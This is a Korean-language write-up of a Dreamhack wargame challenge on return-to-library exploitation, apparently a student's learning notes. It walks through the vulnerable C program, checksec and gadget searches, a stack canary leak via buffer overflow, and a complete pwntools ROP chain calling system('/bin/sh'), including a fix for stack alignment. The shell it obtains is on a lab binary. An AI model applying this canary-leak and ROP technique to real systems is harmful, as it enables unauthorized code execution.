# 문제 코드
```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}

```

# 분석

```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return-to-Library]
└─$ checksec ./rtl
[*] '/home/foo1/Desktop/Dreamhack/Return-to-Library/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
 
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return-to-Library]
└─$ file ./rtl
./rtl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b9c3abd745cccbfbd94ffea0231133838853c9ae, not stripped
```

1. 64비트 아키택처임 
2. dynamic link로 되어 있음
3. 리틀엔디안
4. canary 있음
5. ASLR 활성화
6. NX 활성화 - 스택, 힙 등에서 코드 실행 불가하므로 RTL, ROP 관련일 확률이 높음
7. PIE 비활성화 - binsh 문자열 주소 고정(0x400000)
8. Partial RELRO - PLT, GOT의 주소가 고정임

1단계에서 BOF를 이용해 canary leak 하고, 2단계에서 RTL하면 됨

이 문제에선 libc_base를 구하지 않고도 풀 수 있게 만들기 위해서 의도적으로 `system`을 사용했음
다음에 `system`의 PLT를 사용해 `system`을 사용할 수 있게 됨

한편, `system`함수를 사용하기 위해선, pop rdi; ret 가젯이 필요하므로 찾아보면, 아래와 같음
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rop]
└─$ ROPgadget --binary rop --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret

Unique gadgets found: 1
```

마지막으로, Partial RELRO가 적용되어 있으므로 PLT, GOT가 고정된 주소를 가짐
이를 pwntools의 `e.plt['system'`]에 접근하여 찾을 수 있음
마찬가지로 `e.search(b'/bin/sh)'`를 통해서 /bin/sh의 주소를 찾을 수도 있음
```sh
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc.so.6       0x7ffff7dd8698 0x68732f6e69622f /* '/bin/sh' */
```

```python
from pwn import *

e=ELF('./rtl')
p=process('./rtl')
#p=remote('host3.dreamhack.games',23600)
context.log_level='debug'

binsh=next(e.search(b'/bin/sh'))

print(hex(binsh))
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return-to-Library]
└─$ python3 exploit.py 
[*] '/home/foo1/Desktop/Dreamhack/Return-to-Library/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './rtl': pid 94533
0x400874
```

위의 정보들을 종합하여 코드를 작성해 보면, 아래와 같은 결과를 얻을 수 있음
```python
from pwn import *

e=ELF('./rtl')
p=process('./rtl')
#p=remote('host3.dreamhack.games',23600)
context.log_level='debug'

pop_rdi_ret=0x0000000000400853
system_plt=e.plt['system']
binsh=next(e.search(b'/bin/sh'))
payload=b''
cnry=b'\x00'
buf_size=0x38

print(hex(binsh))

payload+=b'a'*(buf_size+1)
p.sendafter(b'Buf: ',payload)

p.recvuntil(payload)
cnry+=p.recv(7)

payload=b''
payload+=b'a'*buf_size
payload+=cnry
payload+=b'b'*0x8

payload+=p64(pop_rdi_ret)
payload+=p64(binsh)
payload+=p64(system_plt)

p.sendafter(b'Buf: ',payload)

p.interactive()
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return-to-Library]
└─$ python3 exploit.py 
[*] '/home/foo1/Desktop/Dreamhack/Return-to-Library/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './rtl': pid 94758
0x400874
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ ls
[*] Process './rtl' stopped with exit code -11 (SIGSEGV) (pid 94758)
[*] Got EOF while sending in interactive
```

여기서 `[*] Process './rtl' stopped with exit code -11 (SIGSEGV) (pid 94758)` 이 문장은 segfault가 나왔다는 의미인데, Stack Alignment를 안 맞춰져서 그럼
이를 해결하려면, 의미없는 가젯을 넣어줘야 하는데, 이를 위해 사용하는 것이 ret 가젯임
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return-to-Library]
└─$ ROPgadget --binary rtl --re "ret"
Gadgets information
============================================================
0x0000000000400639 : add ah, dh ; nop dword ptr [rax + rax] ; repz ret
0x000000000040063f : add bl, dh ; ret
...
0x0000000000400285 : ret
...
Unique gadgets found: 42

```


# exploit
```sh
from pwn import *

e=ELF('./rtl')
p=process('./rtl')
#p=remote('host3.dreamhack.games',23600)
#context.log_level='debug'

pop_rdi_ret=0x0000000000400853
ret=0x0000000000400285
system_plt=e.plt['system']
binsh=next(e.search(b'/bin/sh'))
payload=b''
cnry=b'\x00'
buf_size=0x38

payload+=b'a'*(buf_size+1)
p.sendafter(b'Buf: ',payload)

p.recvuntil(payload)
cnry+=p.recv(7)

payload=b''
payload+=b'a'*buf_size
payload+=cnry
payload+=b'b'*0x8

payload+=p64(ret)
payload+=p64(pop_rdi_ret)
payload+=p64(binsh)
payload+=p64(system_plt)

p.sendafter(b'Buf: ',payload)

p.interactive()
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return-to-Library]
└─$ python3 exploit.py 
[*] '/home/foo1/Desktop/Dreamhack/Return-to-Library/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './rtl': pid 95189
[*] Switching to interactive mode
$ ls
 exploit.py  'Return to Library.zip'   rtl   rtl.c
$  
```